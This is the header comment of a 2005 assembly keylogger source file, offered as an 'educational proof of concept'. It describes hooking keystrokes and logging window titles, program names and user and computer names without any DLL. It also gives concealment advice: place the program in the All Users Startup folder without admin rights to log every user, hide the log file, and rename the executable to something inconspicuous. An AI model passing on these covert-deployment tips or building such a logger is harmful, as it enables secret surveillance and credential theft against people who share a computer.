;-----------------------------------------------------------------------
; (BEST Viewed with NOTEPAD)
; CopyRight 2005, by ZOverLord at ZOverLords@Yahoo.com - ALL Rights Reserved
;
; "We Don't NEED no STINKIN DLL!"......ENJOY! vist http://testing.OnlyTheRightAnswers.com
;
; Proof Of Concept of using Low-Level Hooks without using any DLL for the Hook
; This Program is for Educational Proof Of Concept Use ONLY!
;
; This Program compiles in 4K, get it that's 4,096 Bytes. I got TIRED of all these folks
; who need a FAT program as well as a FAT DLL to create a Key-Logger so in frustration
; this proof of concept was created. Log Items include:
;
; Date-Time Stamps, Program Name, Window Title, Window Class, Domain Name, Computer Name
; User Name as well as the ability to be placed in StartUp Folders for ANY and/or ALL
; users. There is NOT any requirement for this to run as ADMIN, ANYONE can place it in
; the startup folder of any user, or for all users.
;
; The Logfile is named ZKeyLog.txt and seperate logs can be kept for seperate users this
; can be done automatically by simply placing the program in the:
;
; C:\Documents and Settings\All Users\Start Menu\Programs\Startup folder
;
; C:\Documents and Settings\?USER?\ folder as ZKeyLog.txt 
; ("You can change the File to Hidden if needed")
;
; A Hot-Key of [CTRL]-[ALT]-[F11] will turn the Key-Logger Off
;
; There are two flavors one Raw ASM and one using INVOKES, Raw has more comments, low-level.
;
; You can rename the EXE file to something NOT so obvious if needed, read the AReadMe.txt
;
;-----------------------------------------------------------------------